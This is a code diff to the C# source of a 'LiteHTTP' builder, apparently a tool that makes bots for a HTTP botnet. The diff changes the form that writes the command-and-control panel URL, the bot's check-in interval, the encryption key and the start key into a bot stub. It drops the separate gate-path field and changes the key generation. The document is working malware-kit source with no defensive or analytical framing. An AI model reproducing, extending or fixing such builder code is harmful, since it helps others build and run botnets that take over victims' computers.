@@ -85,11 +85,9 @@ namespace LiteHTTP_Builder
         }
         public string generateKey()
         {
-            string res = randomString(5);
+            string res = randomString(7);
             res += textBox1.Text;
-            res += randomString(5);
-            res += textBox2.Text;
-            res += randomString(5);
+            res += randomString(7);
             return hash(res);
         }
 
@@ -122,14 +120,13 @@ namespace LiteHTTP_Builder
 
         private void button4_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("*PANEL URL*" + Environment.NewLine + "This is the URL to your panel. Do not include a trailing slash, or the full path to your panel." + 
-                            Environment.NewLine + Environment.NewLine + "*PATH TO GATE FILE*" + Environment.NewLine + "This is the path to your gate file, aka /page.php" + 
+            MessageBox.Show("*PANEL URL*" + Environment.NewLine + "This is the URL to your panel. This is the full path to your gate file, ex: http://google.com/gate.php" +  
                             Environment.NewLine + Environment.NewLine + "*REQUEST INTERVAL*" + Environment.NewLine + "This is the interval at which your bot checks in with the panel (in minutes).", "Help", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
-            if (textBox1.Text == "" || textBox2.Text == "" || textBox3.Text == "" || textBox4.Text == "")
+            if (textBox1.Text == "" || textBox3.Text == "" || textBox4.Text == "")
             {
                 MessageBox.Show("Please fill in all fields.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 return;
@@ -140,7 +137,6 @@ namespace LiteHTTP_Builder
             {
                 string stub = Properties.Resources.stub;
                 stub = stub.Replace("#panelurl#", textBox1.Text);
-                stub = stub.Replace("#gatepath#", textBox2.Text);
                 stub = stub.Replace("#rint#", numericUpDown1.Value.ToString());
                 stub = stub.Replace("#encryptionkey#", textBox3.Text);
                 stub = stub.Replace("#startkey#", textBox4.Text);
